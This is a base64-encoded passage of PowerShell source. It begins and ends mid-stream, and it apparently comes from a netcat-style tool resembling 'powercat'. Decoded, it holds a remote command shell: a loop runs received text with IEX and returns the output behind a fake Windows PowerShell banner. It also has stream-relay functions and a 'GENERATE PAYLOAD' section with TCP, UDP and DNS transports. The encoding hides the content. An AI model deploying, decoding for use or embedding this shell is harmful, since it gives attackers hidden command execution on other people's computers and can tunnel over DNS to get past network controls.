JzID0gQHt9CiAgICAgICAgJFByb2Nlc3NTdGFydEluZm8gPSBOZXctT2JqZWN0IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvCiAgICAgICAgJFByb2Nlc3NTdGFydEluZm8uRmlsZU5hbWUgPSAkRnVuY1NldHVwVmFyc1swXQogICAgICAgICRQcm9jZXNzU3RhcnRJbmZvLlVzZVNoZWxsRXhlY3V0ZSA9ICRGYWxzZQogICAgICAgICRQcm9jZXNzU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRJbnB1dCA9ICRUcnVlCiAgICAgICAgJFByb2Nlc3NTdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZE91dHB1dCA9ICRUcnVlCiAgICAgICAgJFByb2Nlc3NTdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZEVycm9yID0gJFRydWUKICAgICAgICAkRnVuY1ZhcnNbIlByb2Nlc3MiXSA9IFtTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2Vzc106OlN0YXJ0KCRQcm9jZXNzU3RhcnRJbmZvKQogICAgICAgIFdyaXRlLVZlcmJvc2UgKCJTdGFydGluZyBQcm9jZXNzICIgKyAkRnVuY1NldHVwVmFyc1swXSArICIuLi4iKQogICAgICAgICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YXJ0KCkgfCBPdXQtTnVsbAogICAgICAgICRGdW5jVmFyc1siU3RkT3V0RGVzdGluYXRpb25CdWZmZXIiXSA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSA2NTUzNgogICAgICAgICRGdW5jVmFyc1siU3RkT3V0UmVhZE9wZXJhdGlvbiJdID0gJEZ1bmNWYXJzWyJQcm9jZXNzIl0uU3RhbmRhcmRPdXRwdXQuQmFzZVN0cmVhbS5CZWdpblJlYWQoJEZ1bmNWYXJzWyJTdGRPdXREZXN0aW5hdGlvbkJ1ZmZlciJdLCAwLCA2NTUzNiwgJG51bGwsICRudWxsKQogICAgICAgICRGdW5jVmFyc1siU3RkRXJyRGVzdGluYXRpb25CdWZmZXIiXSA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSA2NTUzNgogICAgICAgICRGdW5jVmFyc1siU3RkRXJyUmVhZE9wZXJhdGlvbiJdID0gJEZ1bmNWYXJzWyJQcm9jZXNzIl0uU3RhbmRhcmRFcnJvci5CYXNlU3RyZWFtLkJlZ2luUmVhZCgkRnVuY1ZhcnNbIlN0ZEVyckRlc3RpbmF0aW9uQnVmZmVyIl0sIDAsIDY1NTM2LCAkbnVsbCwgJG51bGwpCiAgICAgICAgJEZ1bmNWYXJzWyJFbmNvZGluZyJdID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nCiAgICAgICAgcmV0dXJuICRGdW5jVmFycwogICAgfQogICAgZnVuY3Rpb24gUmVhZERhdGFfQ01EIHsKICAgICAgICBwYXJhbSgkRnVuY1ZhcnMpCiAgICAgICAgW2J5dGVbXV0kRGF0YSA9IEAoKQogICAgICAgIGlmICgkRnVuY1ZhcnNbIlN0ZE91dFJlYWRPcGVyYXRpb24iXS5Jc0NvbXBsZXRlZCkgewogICAgICAgICAgICAkU3RkT3V0Qnl0ZXNSZWFkID0gJEZ1bmNWYXJzWyJQcm9jZXNzIl0uU3RhbmRhcmRPdXRwdXQuQmFzZVN0cmVhbS5FbmRSZWFkKCRGdW5jVmFyc1siU3RkT3V0UmVhZE9wZXJhdGlvbiJdKQogICAgICAgICAgICBpZiAoJFN0ZE91dEJ5dGVzUmVhZCAtZXEgMCkge2JyZWFrfQogICAgICAgICAgICAkRGF0YSArPSAkRnVuY1ZhcnNbIlN0ZE91dERlc3RpbmF0aW9uQnVmZmVyIl1bMC4uKFtpbnRdJFN0ZE91dEJ5dGVzUmVhZCAtIDEpXQogICAgICAgICAgICAkRnVuY1ZhcnNbIlN0ZE91dFJlYWRPcGVyYXRpb24iXSA9ICRGdW5jVmFyc1siUHJvY2VzcyJdLlN0YW5kYXJkT3V0cHV0LkJhc2VTdHJlYW0uQmVnaW5SZWFkKCRGdW5jVmFyc1siU3RkT3V0RGVzdGluYXRpb25CdWZmZXIiXSwgMCwgNjU1MzYsICRudWxsLCAkbnVsbCkKICAgICAgICB9CiAgICAgICAgaWYgKCRGdW5jVmFyc1siU3RkRXJyUmVhZE9wZXJhdGlvbiJdLklzQ29tcGxldGVkKSB7CiAgICAgICAgICAgICRTdGRFcnJCeXRlc1JlYWQgPSAkRnVuY1ZhcnNbIlByb2Nlc3MiXS5TdGFuZGFyZEVycm9yLkJhc2VTdHJlYW0uRW5kUmVhZCgkRnVuY1ZhcnNbIlN0ZEVyclJlYWRPcGVyYXRpb24iXSkKICAgICAgICAgICAgaWYgKCRTdGRFcnJCeXRlc1JlYWQgLWVxIDApIHticmVha30KICAgICAgICAgICAgJERhdGEgKz0gJEZ1bmNWYXJzWyJTdGRFcnJEZXN0aW5hdGlvbkJ1ZmZlciJdWzAuLihbaW50XSRTdGRFcnJCeXRlc1JlYWQgLSAxKV0KICAgICAgICAgICAgJEZ1bmNWYXJzWyJTdGRFcnJSZWFkT3BlcmF0aW9uIl0gPSAkRnVuY1ZhcnNbIlByb2Nlc3MiXS5TdGFuZGFyZEVycm9yLkJhc2VTdHJlYW0uQmVnaW5SZWFkKCRGdW5jVmFyc1siU3RkRXJyRGVzdGluYXRpb25CdWZmZXIiXSwgMCwgNjU1MzYsICRudWxsLCAkbnVsbCkKICAgICAgICB9CiAgICAgICAgcmV0dXJuICREYXRhLCAkRnVuY1ZhcnMKICAgIH0KICAgIGZ1bmN0aW9uIFdyaXRlRGF0YV9DTUQgewogICAgICAgIHBhcmFtKCREYXRhLCAkRnVuY1ZhcnMpCiAgICAgICAgJEZ1bmNWYXJzWyJQcm9jZXNzIl0uU3RhbmRhcmRJbnB1dC5Xcml0ZUxpbmUoJEZ1bmNWYXJzWyJFbmNvZGluZyJdLkdldFN0cmluZygkRGF0YSkuVHJpbUVuZCgiYHIiKS5UcmltRW5kKCJgbiIpKQogICAgICAgIHJldHVybiAkRnVuY1ZhcnMKICAgIH0KICAgIGZ1bmN0aW9uIENsb3NlX0NNRCB7CiAgICAgICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgICAgICRGdW5jVmFyc1siUHJvY2VzcyJdIHwgU3RvcC1Qcm9jZXNzCiAgICB9ICAKICAgICMjIyMjIyMjIyMgQ01EIEZVTkNUSU9OUyAjIyMjIyMjIyMjCiAgCiAgICAjIyMjIyMjIyMjIFBPV0VSU0hFTEwgRlVOQ1RJT05TICMjIyMjIyMjIyMKICAgIGZ1bmN0aW9uIE1haW5fUG93ZXJzaGVsbCB7CiAgICAgICAgcGFyYW0oJFN0cmVhbTFTZXR1cFZhcnMpICAgCiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgJGVuY29kaW5nID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nCiAgICAgICAgICAgIFtieXRlW11dJElucHV0VG9Xcml0ZSA9IEAoKQogICAgICAgICAgICBpZiAoJGkgLW5lICRudWxsKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJJbnB1dCBmcm9tIC1pIGRldGVjdGVkLi4uIgogICAgICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAkaSkgeyBbYnl0ZVtdXSRJbnB1dFRvV3JpdGUgPSAoW2lvLmZpbGVdOjpSZWFkQWxsQnl0ZXMoJGkpKSB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCRpLkdldFR5cGUoKS5OYW1lIC1lcSAiQnl0ZVtdIikgeyBbYnl0ZVtdXSRJbnB1dFRvV3JpdGUgPSAkaSB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCRpLkdldFR5cGUoKS5OYW1lIC1lcSAiU3RyaW5nIikgeyBbYnl0ZVtdXSRJbnB1dFRvV3JpdGUgPSAkRW5jb2RpbmcuR2V0Qnl0ZXMoJGkpIH0KICAgICAgICAgICAgICAgIGVsc2Uge1dyaXRlLUhvc3QgIlVucmVjb2duaXNlZCBpbnB1dCB0eXBlLiIgOyByZXR1cm59CiAgICAgICAgICAgIH0KICAgIAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJTZXR0aW5nIHVwIFN0cmVhbSAxLi4uIChFU0MvQ1RSTCB0byBleGl0KSIKICAgICAgICAgICAgdHJ5IHskU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1NldHVwICRTdHJlYW0xU2V0dXBWYXJzfQogICAgICAgICAgICBjYXRjaCB7V3JpdGUtVmVyYm9zZSAiU3RyZWFtIDEgU2V0dXAgRmFpbHVyZSIgOyByZXR1cm59CiAgICAgIAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJTZXR0aW5nIHVwIFN0cmVhbSAyLi4uIChFU0MvQ1RSTCB0byBleGl0KSIKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRJbnRyb1Byb21wdCA9ICRFbmNvZGluZy5HZXRCeXRlcygiV2luZG93cyBQb3dlclNoZWxsYG5Db3B5cmlnaHQgKEMpIDIwMTMgTWljcm9zb2Z0IENvcnBvcmF0aW9uLiBBbGwgcmlnaHRzIHJlc2VydmVkLmBuYG4iICsgKCJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICIpKQogICAgICAgICAgICAgICAgJFByb21wdCA9ICgiUFMgIiArIChwd2QpLlBhdGggKyAiPiAiKQogICAgICAgICAgICAgICAgJENvbW1hbmRUb0V4ZWN1dGUgPSAiIiAgICAgIAogICAgICAgICAgICAgICAgJERhdGEgPSAkbnVsbAogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlN0cmVhbSAyIFNldHVwIEZhaWx1cmUiIDsgcmV0dXJuCiAgICAgICAgICAgIH0KICAgICAgCiAgICAgICAgICAgIGlmICgkSW5wdXRUb1dyaXRlIC1uZSBAKCkpIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIldyaXRpbmcgaW5wdXQgdG8gU3RyZWFtIDEuLi4iCiAgICAgICAgICAgICAgICB0cnkgeyRTdHJlYW0xVmFycyA9IFN0cmVhbTFfV3JpdGVEYXRhICRJbnB1dFRvV3JpdGUgJFN0cmVhbTFWYXJzfQogICAgICAgICAgICAgICAgY2F0Y2gge1dyaXRlLUhvc3QgIkZhaWxlZCB0byB3cml0ZSBpbnB1dCB0byBTdHJlYW0gMSIgOyByZXR1cm59CiAgICAgICAgICAgIH0KICAgICAgCiAgICAgICAgICAgIGlmICgkZCkge1dyaXRlLVZlcmJvc2UgIi1kIChkaXNjb25uZWN0KSBBY3RpdmF0ZWQuIERpc2Nvbm5lY3RpbmcuLi4iIDsgcmV0dXJufQogICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQm90aCBDb21tdW5pY2F0aW9uIFN0cmVhbXMgRXN0YWJsaXNoZWQuIFJlZGlyZWN0aW5nIERhdGEgQmV0d2VlbiBTdHJlYW1zLi4uIgogICAgICAgICAgICB3aGlsZSAoJFRydWUpIHsgICAgICAgIAogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAjIyMjIyBTdHJlYW0yIFJlYWQgIyMjIyMKICAgICAgICAgICAgICAgICAgICAkUHJvbXB0ID0gJG51bGwKICAgICAgICAgICAgICAgICAgICAkUmV0dXJuZWREYXRhID0gJG51bGwKICAgICAgICAgICAgICAgICAgICBpZiAoJENvbW1hbmRUb0V4ZWN1dGUgLW5lICIiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7W2J5dGVbXV0kUmV0dXJuZWREYXRhID0gJEVuY29kaW5nLkdldEJ5dGVzKChJRVggJENvbW1hbmRUb0V4ZWN1dGUgMj4mMSB8IE91dC1TdHJpbmcpKX0KICAgICAgICAgICAgICAgICAgICAgICAgY2F0Y2gge1tieXRlW11dJFJldHVybmVkRGF0YSA9ICRFbmNvZGluZy5HZXRCeXRlcygoJF8gfCBPdXQtU3RyaW5nKSl9CiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9tcHQgPSAkRW5jb2RpbmcuR2V0Qnl0ZXMoKCJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICIpKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkRGF0YSArPSAkSW50cm9Qcm9tcHQKICAgICAgICAgICAgICAgICAgICAkSW50cm9Qcm9tcHQgPSAkbnVsbAogICAgICAgICAgICAgICAgICAgICREYXRhICs9ICRSZXR1cm5lZERhdGEKICAgICAgICAgICAgICAgICAgICAkRGF0YSArPSAkUHJvbXB0CiAgICAgICAgICAgICAgICAgICAgJENvbW1hbmRUb0V4ZWN1dGUgPSAiIgogICAgICAgICAgICAgICAgICAgICMjIyMjIFN0cmVhbTIgUmVhZCAjIyMjIwoKICAgICAgICAgICAgICAgICAgICBpZiAoJERhdGEgLW5lICRudWxsKSB7JFN0cmVhbTFWYXJzID0gU3RyZWFtMV9Xcml0ZURhdGEgJERhdGEgJFN0cmVhbTFWYXJzfQogICAgICAgICAgICAgICAgICAgICREYXRhID0gJG51bGwKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJGYWlsZWQgdG8gcmVkaXJlY3QgZGF0YSBmcm9tIFN0cmVhbSAyIHRvIFN0cmVhbSAxIiA7IHJldHVybgogICAgICAgICAgICAgICAgfQogICAgICAgIAogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAkRGF0YSwgJFN0cmVhbTFWYXJzID0gU3RyZWFtMV9SZWFkRGF0YSAkU3RyZWFtMVZhcnMKICAgICAgICAgICAgICAgICAgICBpZiAoJERhdGEuTGVuZ3RoIC1lcSAwKSB7U3RhcnQtU2xlZXAgLU1pbGxpc2Vjb25kcyAxMDB9CiAgICAgICAgICAgICAgICAgICAgaWYgKCREYXRhIC1uZSAkbnVsbCkgeyRDb21tYW5kVG9FeGVjdXRlID0gJEVuY29kaW5nLkdldFN0cmluZygkRGF0YSl9CiAgICAgICAgICAgICAgICAgICAgJERhdGEgPSAkbnVsbAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkZhaWxlZCB0byByZWRpcmVjdCBkYXRhIGZyb20gU3RyZWFtIDEgdG8gU3RyZWFtIDIiIDsgcmV0dXJuCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZmluYWxseSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJDbG9zaW5nIFN0cmVhbSAxLi4uIgogICAgICAgICAgICAgICAgU3RyZWFtMV9DbG9zZSAkU3RyZWFtMVZhcnMKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJGYWlsZWQgdG8gY2xvc2UgU3RyZWFtIDEiCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICAjIyMjIyMjIyMjIFBPV0VSU0hFTEwgRlVOQ1RJT05TICMjIyMjIyMjIyMKCiAgICAjIyMjIyMjIyMjIENPTlNPTEUgRlVOQ1RJT05TICMjIyMjIyMjIyMKICAgIGZ1bmN0aW9uIFNldHVwX0NvbnNvbGUgewogICAgICAgIHBhcmFtKCRGdW5jU2V0dXBWYXJzKQogICAgICAgICRGdW5jVmFycyA9IEB7fQogICAgICAgICRGdW5jVmFyc1siRW5jb2RpbmciXSA9IE5ldy1PYmplY3QgU3lzdGVtLlRleHQuQXNjaWlFbmNvZGluZwogICAgICAgICRGdW5jVmFyc1siT3V0cHV0Il0gPSAkRnVuY1NldHVwVmFyc1swXQogICAgICAgICRGdW5jVmFyc1siT3V0cHV0Qnl0ZXMiXSA9IFtieXRlW11dQCgpCiAgICAgICAgJEZ1bmNWYXJzWyJPdXRwdXRTdHJpbmciXSA9ICIiCiAgICAgICAgcmV0dXJuICRGdW5jVmFycwogICAgfQogICAgZnVuY3Rpb24gUmVhZERhdGFfQ29uc29sZSB7CiAgICAgICAgcGFyYW0oJEZ1bmNWYXJzKQogICAgICAgICREYXRhID0gJG51bGwKICAgICAgICBpZiAoJEhvc3QuVUkuUmF3VUkuS2V5QXZhaWxhYmxlKSB7CiAgICAgICAgICAgICREYXRhID0gJEZ1bmNWYXJzWyJFbmNvZGluZyJdLkdldEJ5dGVzKChSZWFkLUhvc3QpICsgImBuIikKICAgICAgICB9CiAgICAgICAgcmV0dXJuICREYXRhLCAkRnVuY1ZhcnMKICAgIH0KICAgIGZ1bmN0aW9uIFdyaXRlRGF0YV9Db25zb2xlIHsKICAgICAgICBwYXJhbSgkRGF0YSwgJEZ1bmNWYXJzKQogICAgICAgIHN3aXRjaCAoJEZ1bmNWYXJzWyJPdXRwdXQiXSkgewogICAgICAgICAgICAiSG9zdCIge1dyaXRlLUhvc3QgLW4gJEZ1bmNWYXJzWyJFbmNvZGluZyJdLkdldFN0cmluZygkRGF0YSl9CiAgICAgICAgICAgICJTdHJpbmciIHskRnVuY1ZhcnNbIk91dHB1dFN0cmluZyJdICs9ICRGdW5jVmFyc1siRW5jb2RpbmciXS5HZXRTdHJpbmcoJERhdGEpfQogICAgICAgICAgICAiQnl0ZXMiIHskRnVuY1ZhcnNbIk91dHB1dEJ5dGVzIl0gKz0gJERhdGF9CiAgICAgICAgfQogICAgICAgIHJldHVybiAkRnVuY1ZhcnMKICAgIH0KICAgIGZ1bmN0aW9uIENsb3NlX0NvbnNvbGUgewogICAgICAgIHBhcmFtKCRGdW5jVmFycykKICAgICAgICBpZiAoJEZ1bmNWYXJzWyJPdXRwdXRTdHJpbmciXSAtbmUgIiIpIHtyZXR1cm4gJEZ1bmNWYXJzWyJPdXRwdXRTdHJpbmciXX0KICAgICAgICBlbHNlaWYgKCRGdW5jVmFyc1siT3V0cHV0Qnl0ZXMiXSAtbmUgQCgpKSB7cmV0dXJuICRGdW5jVmFyc1siT3V0cHV0Qnl0ZXMiXX0KICAgICAgICByZXR1cm4KICAgIH0KICAgICMjIyMjIyMjIyMgQ09OU09MRSBGVU5DVElPTlMgIyMjIyMjIyMjIwogIAogICAgIyMjIyMjIyMjIyBNQUlOIEZVTkNUSU9OICMjIyMjIyMjIyMKICAgIGZ1bmN0aW9uIE1haW4gewogICAgICAgIHBhcmFtKCRTdHJlYW0xU2V0dXBWYXJzLCAkU3RyZWFtMlNldHVwVmFycykKICAgICAgICB0cnkgewogICAgICAgICAgICBbYnl0ZVtdXSRJbnB1dFRvV3JpdGUgPSBAKCkKICAgICAgICAgICAgJEVuY29kaW5nID0gTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5Bc2NpaUVuY29kaW5nCiAgICAgICAgICAgIGlmICgkaSAtbmUgJG51bGwpIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIklucHV0IGZyb20gLWkgZGV0ZWN0ZWQuLi4iCiAgICAgICAgICAgICAgICBpZiAoVGVzdC1QYXRoICRpKSB7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9IChbaW8uZmlsZV06OlJlYWRBbGxCeXRlcygkaSkpIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJGkuR2V0VHlwZSgpLk5hbWUgLWVxICJCeXRlW10iKSB7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9ICRpIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJGkuR2V0VHlwZSgpLk5hbWUgLWVxICJTdHJpbmciKSB7IFtieXRlW11dJElucHV0VG9Xcml0ZSA9ICRFbmNvZGluZy5HZXRCeXRlcygkaSkgfQogICAgICAgICAgICAgICAgZWxzZSB7V3JpdGUtSG9zdCAiVW5yZWNvZ25pc2VkIGlucHV0IHR5cGUuIiA7IHJldHVybn0KICAgICAgICAgICAgfQogICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0dGluZyB1cCBTdHJlYW0gMS4uLiIKICAgICAgICAgICAgdHJ5IHskU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1NldHVwICRTdHJlYW0xU2V0dXBWYXJzfQogICAgICAgICAgICBjYXRjaCB7V3JpdGUtVmVyYm9zZSAiU3RyZWFtIDEgU2V0dXAgRmFpbHVyZSIgOyByZXR1cm59CiAgICAgIAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJTZXR0aW5nIHVwIFN0cmVhbSAyLi4uIgogICAgICAgICAgICB0cnkgeyRTdHJlYW0yVmFycyA9IFN0cmVhbTJfU2V0dXAgJFN0cmVhbTJTZXR1cFZhcnN9CiAgICAgICAgICAgIGNhdGNoIHtXcml0ZS1WZXJib3NlICJTdHJlYW0gMiBTZXR1cCBGYWlsdXJlIiA7IHJldHVybn0KICAgICAgCiAgICAgICAgICAgICREYXRhID0gJG51bGwKICAgICAgCiAgICAgICAgICAgIGlmICgkSW5wdXRUb1dyaXRlIC1uZSBAKCkpIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIldyaXRpbmcgaW5wdXQgdG8gU3RyZWFtIDEuLi4iCiAgICAgICAgICAgICAgICB0cnkgeyRTdHJlYW0xVmFycyA9IFN0cmVhbTFfV3JpdGVEYXRhICRJbnB1dFRvV3JpdGUgJFN0cmVhbTFWYXJzfQogICAgICAgICAgICAgICAgY2F0Y2gge1dyaXRlLUhvc3QgIkZhaWxlZCB0byB3cml0ZSBpbnB1dCB0byBTdHJlYW0gMSIgOyByZXR1cm59CiAgICAgICAgICAgIH0KICAgICAgCiAgICAgICAgICAgIGlmICgkZCkge1dyaXRlLVZlcmJvc2UgIi1kIChkaXNjb25uZWN0KSBBY3RpdmF0ZWQuIERpc2Nvbm5lY3RpbmcuLi4iIDsgcmV0dXJufQogICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQm90aCBDb21tdW5pY2F0aW9uIFN0cmVhbXMgRXN0YWJsaXNoZWQuIFJlZGlyZWN0aW5nIERhdGEgQmV0d2VlbiBTdHJlYW1zLi4uIgogICAgICAgICAgICB3aGlsZSAoJFRydWUpIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgJERhdGEsICRTdHJlYW0yVmFycyA9IFN0cmVhbTJfUmVhZERhdGEgJFN0cmVhbTJWYXJzCiAgICAgICAgICAgICAgICAgICAgaWYgKCgkRGF0YS5MZW5ndGggLWVxIDApIC1vciAoJERhdGEgLWVxICRudWxsKSkge1N0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgMTAwfQogICAgICAgICAgICAgICAgICAgIGlmICgkRGF0YSAtbmUgJG51bGwpIHskU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1dyaXRlRGF0YSAkRGF0YSAkU3RyZWFtMVZhcnN9CiAgICAgICAgICAgICAgICAgICAgJERhdGEgPSAkbnVsbAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY2F0Y2ggewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkZhaWxlZCB0byByZWRpcmVjdCBkYXRhIGZyb20gU3RyZWFtIDIgdG8gU3RyZWFtIDEiIDsgcmV0dXJuCiAgICAgICAgICAgICAgICB9CiAgICAgICAgCiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICREYXRhLCAkU3RyZWFtMVZhcnMgPSBTdHJlYW0xX1JlYWREYXRhICRTdHJlYW0xVmFycwogICAgICAgICAgICAgICAgICAgIGlmICgoJERhdGEuTGVuZ3RoIC1lcSAwKSAtb3IgKCREYXRhIC1lcSAkbnVsbCkpIHtTdGFydC1TbGVlcCAtTWlsbGlzZWNvbmRzIDEwMH0KICAgICAgICAgICAgICAgICAgICBpZiAoJERhdGEgLW5lICRudWxsKSB7JFN0cmVhbTJWYXJzID0gU3RyZWFtMl9Xcml0ZURhdGEgJERhdGEgJFN0cmVhbTJWYXJzfQogICAgICAgICAgICAgICAgICAgICREYXRhID0gJG51bGwKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJGYWlsZWQgdG8gcmVkaXJlY3QgZGF0YSBmcm9tIFN0cmVhbSAxIHRvIFN0cmVhbSAyIiA7IHJldHVybgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGZpbmFsbHkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgI1dyaXRlLVZlcmJvc2UgIkNsb3NpbmcgU3RyZWFtIDIuLi4iCiAgICAgICAgICAgICAgICBTdHJlYW0yX0Nsb3NlICRTdHJlYW0yVmFycwogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkZhaWxlZCB0byBjbG9zZSBTdHJlYW0gMiIKICAgICAgICAgICAgfQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgI1dyaXRlLVZlcmJvc2UgIkNsb3NpbmcgU3RyZWFtIDEuLi4iCiAgICAgICAgICAgICAgICBTdHJlYW0xX0Nsb3NlICRTdHJlYW0xVmFycwogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkZhaWxlZCB0byBjbG9zZSBTdHJlYW0gMSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgICMjIyMjIyMjIyMgTUFJTiBGVU5DVElPTiAjIyMjIyMjIyMjCiAgCiAgICAjIyMjIyMjIyMjIEdFTkVSQVRFIFBBWUxPQUQgIyMjIyMjIyMjIwogICAgaWYgKCR1KSB7CiAgICAgICAgV3JpdGUtVmVyYm9zZSAiU2V0IFN0cmVhbSAxOiBVRFAiCiAgICAgICAgJEZ1bmN0aW9uU3RyaW5nID0gKCJmdW5jdGlvbiBTdHJlYW0xX1NldHVwYG57YG4iICsgJHtmdW5jdGlvbjpTZXR1cF9VRFB9ICsgImBufWBuYG4iKQogICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfUmVhZERhdGFgbntgbiIgKyAke2Z1bmN0aW9uOlJlYWREYXRhX1VEUH0gKyAiYG59YG5gbiIpCiAgICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9Xcml0ZURhdGFgbntgbiIgKyAke2Z1bmN0aW9uOldyaXRlRGF0YV9VRFB9ICsgImBufWBuYG4iKQogICAgICAgICRGdW5jdGlvblN0cmluZyArPSAoImZ1bmN0aW9uIFN0cmVhbTFfQ2xvc2VgbntgbiIgKyAke2Z1bmN0aW9uOkNsb3NlX1VEUH0gKyAiYG59YG5gbiIpICAgIAogICAgICAgIGlmICgkbCkgeyRJbnZva2VTdHJpbmcgPSAiTWFpbiBAKCcnLGAkVHJ1ZSwnJHAnLCckdCcpICJ9CiAgICAgICAgZWxzZSB7JEludm9rZVN0cmluZyA9ICJNYWluIEAoJyRjJyxgJEZhbHNlLCckcCcsJyR0JykgIn0KICAgIH0KICAgIGVsc2VpZiAoJGRucyAtbmUgIiIpIHsKICAgICAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDE6IEROUyIKICAgICAgICAkRnVuY3Rpb25TdHJpbmcgPSAoImZ1bmN0aW9uIFN0cmVhbTFfU2V0dXBgbntgbiIgKyAke2Z1bmN0aW9uOlNldHVwX0ROU30gKyAiYG59YG5gbiIpCiAgICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfRE5TfSArICJgbn1gbmBuIikKICAgICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY3Rpb246V3JpdGVEYXRhX0ROU30gKyAiYG59YG5gbiIpCiAgICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9DbG9zZWBue2BuIiArICR7ZnVuY3Rpb246Q2xvc2VfRE5TfSArICJgbn1gbmBuIikKICAgICAgICBpZiAoJGwpIHtyZXR1cm4gIlRoaXMgZmVhdHVyZSBpcyBub3QgYXZhaWxhYmxlLiJ9CiAgICAgICAgZWxzZSB7JEludm9rZVN0cmluZyA9ICJNYWluIEAoJyRjJywnJHAnLCckZG5zJywkZG5zZnQpICJ9CiAgICB9CiAgICBlbHNlIHsKICAgICAgICBXcml0ZS1WZXJib3NlICJTZXQgU3RyZWFtIDE6IFRDUCIKICAgICAgICAkRnVuY3Rpb25TdHJpbmcgPSAoImZ1bmN0aW9uIFN0cmVhbTFfU2V0dXBgbntgbiIgKyAke2Z1bmN0aW9uOlNldHVwX1RDUH0gKyAiYG59YG5gbiIpCiAgICAgICAgJEZ1bmN0aW9uU3RyaW5nICs9ICgiZnVuY3Rpb24gU3RyZWFtMV9SZWFkRGF0YWBue2BuIiArICR7ZnVuY3Rpb246UmVhZERhdGFfVENQfSArICJgbn1gbmBuIikKICAgICAgICAkRnVuY3Rpb25TdHJpbmcgKz0gKCJmdW5jdGlvbiBTdHJlYW0xX1dyaXRlRGF0YWBue2BuIiArICR7ZnVuY